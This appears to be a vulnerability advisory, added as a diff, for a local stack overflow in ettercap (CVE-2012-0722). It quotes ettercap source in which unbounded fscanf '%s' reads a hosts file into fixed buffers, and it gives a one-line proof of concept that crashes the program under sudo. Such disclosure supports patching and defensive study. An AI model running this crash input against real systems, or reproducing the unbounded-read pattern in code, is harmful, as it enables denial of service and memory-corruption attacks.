@@ -1,0 +1,68 @@
+Title: Ettercap Stack overflow (CWE-121)
+References: CVE-2012-0722
+Discovered by: Sajjad Pourali
+Vendor: http://www.ettercap.sourceforge.net/
+Vendor contact: 13-01-01 21:20 UTC (No response)
+Solution: Using the patch
+Patch: http://www.securation.com/files/2013/01/ec.patch
+
+Local: Yes
+Remote: No
+Impact: low
+
+Affected:
+ - ettercap 0.7.5.1
+ - ettercap 0.7.5
+ - ettercap 0.7.4 and earlier
+Not affected:
+ - ettercap 0.7.4.1
+
+---
+
+Trace vulnerable place:
+
+./include/ec_inet.h:27-44
+enum {
+   NS_IN6ADDRSZ            = 16,
+   NS_INT16SZ              = 2,
+
+   ETH_ADDR_LEN            = 6,
+   TR_ADDR_LEN             = 6,
+   FDDI_ADDR_LEN           = 6,
+   MEDIA_ADDR_LEN          = 6,
+
+   IP_ADDR_LEN             = 4,
+   IP6_ADDR_LEN            = 16,
+   MAX_IP_ADDR_LEN         = IP6_ADDR_LEN,
+
+   ETH_ASCII_ADDR_LEN      = sizeof("ff:ff:ff:ff:ff:ff")+1,
+   IP_ASCII_ADDR_LEN       = sizeof("255.255.255.255")+1,
+   IP6_ASCII_ADDR_LEN      = sizeof("ffff:ffff:ffff:ffff:ffff:ffff:255.255.255.255")+1,
+   MAX_ASCII_ADDR_LEN      = IP6_ASCII_ADDR_LEN,
+};
+
+./include/ec_resolv.h:42
+#define MAX_HOSTNAME_LEN   64
+
+./src/ec_scan.c:610-614
+char ip[MAX_ASCII_ADDR_LEN];
+char mac[ETH_ASCII_ADDR_LEN];
+char name[MAX_HOSTNAME_LEN];
+
+
+./src/ec_scan.c:633-635
+if (fscanf(hf, "%s %s %s\n", ip, mac, name) != 3 ||
+         *ip == '#' || *mac == '#' || *name == '#')
+         continue;
+
+---
+
+PoC:
+
+sudo ruby -e'puts"a"*2000' > overflow && sudo ettercap -T -j overflow
+
+---
+
+ + Sajjad Pourali
+ + http://www.securation.com
+ + Contact: sajjad[at]securation.com
